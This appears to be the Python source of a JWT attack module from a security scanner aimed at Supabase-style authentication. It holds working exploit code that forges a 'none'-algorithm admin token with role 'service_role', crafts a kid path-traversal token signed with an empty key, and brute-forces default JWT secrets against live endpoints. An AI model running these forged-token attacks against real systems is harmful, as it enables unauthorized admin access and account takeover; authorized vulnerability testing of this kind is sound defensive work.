from typing import Dict ,Any 
import jwt 
from ssf.core .base import BaseScanner 

class JWTScanner (BaseScanner ):
    async def scan (self )->Dict [str ,Any ]:
        self .log_info ("[*] Starting JWT Attack Module...")
        result ={
        "none_alg":False ,
        "weak_secret":None ,
        "risk":"SAFE",
        "details":""
        }


        if await self ._test_none_alg ():
            result ["none_alg"]=True 
            result ["risk"]="CRITICAL"
            result ["details"]+="Vulnerable to 'None' Algorithm Attack. "
            self .log_risk ("    [!] Vulnerable to JWT 'None' Algorithm!","CRITICAL")


        secret =await self ._test_weak_secret ()
        if secret :
            result ["weak_secret"]=secret 
            result ["risk"]="CRITICAL"
            result ["details"]+=f"Weak JWT Secret found: {secret }"
            self .log_risk (f"    [!] Weak JWT Secret found: {secret }","CRITICAL")

        if await self ._test_kid_injection ():
            result ["kid_injection"]=True 
            result ["risk"]="CRITICAL"
            result ["details"]+="Vulnerable to KID Injection. "
            self .log_risk ("    [!] Vulnerable to KID Injection!","CRITICAL")

        return result 

    async def _test_none_alg (self )->bool :


        try :

            payload =jwt .decode (self .client .config .key ,options ={"verify_signature":False })





            import base64 
            import json 

            header ={"typ":"JWT","alg":"none"}

            def b64url (data ):
                return base64 .urlsafe_b64encode (json .dumps (data ).encode ()).decode ().rstrip ("=")

            fake_token =f"{b64url (header )}.{b64url (payload )}."
















            payload ["role"]="service_role"
            fake_token_admin =f"{b64url (header )}.{b64url (payload )}."





            headers =self .client .headers .copy ()
            headers ["Authorization"]=f"Bearer {fake_token_admin }"
            headers ["apikey"]=self .client .config .key 



            r =await self .client .get ("/auth/v1/admin/users",headers =headers )
            if r .status_code ==200 :
                return True 

        except Exception as e :
            self .log_error (f"Error in None alg test: {e }")

        return False 

    async def _test_kid_injection (self )->bool :
        try :
            payload =jwt .decode (self .client .config .key ,options ={"verify_signature":False })
            import base64 
            import json 
            header ={"typ":"JWT","alg":"HS256","kid":"../../../../../dev/null"}
            def b64url (data ):
                return base64 .urlsafe_b64encode (json .dumps (data ).encode ()).decode ().rstrip ("=")


            fake_token =f"{b64url (header )}.{b64url (payload )}."

            signature =base64 .urlsafe_b64encode (
            jwt .utils .base64url_decode (
            jwt .encode (payload ,"",algorithm ="HS256").split (".")[2 ]
            )
            ).decode ().rstrip ("=")

            fake_token =f"{b64url (header )}.{b64url (payload )}.{signature }"

            headers =self .client .headers .copy ()
            headers ["Authorization"]=f"Bearer {fake_token }"

            r =await self .client .get ("/auth/v1/user",headers =headers )
            if r .status_code ==200 :
                return True 
        except Exception :
            pass 
        return False 

    async def _test_weak_secret (self )->str :

        common_secrets =[
        "super-secret-jwt-token-with-at-least-32-characters-long",
        "supa-secret-jwt-token-with-at-least-32-characters-long",
        "secret","password","123456","supabase",
        "this-is-a-super-secret-jwt-token-with-at-least-32-characters-long"
        ]





        token =self .client .config .key 

        for secret in common_secrets :
            try :
                jwt .decode (token ,secret ,algorithms =["HS256"])
                return secret 
            except jwt .InvalidSignatureError :
                continue 
            except Exception :
                continue 

        return None 

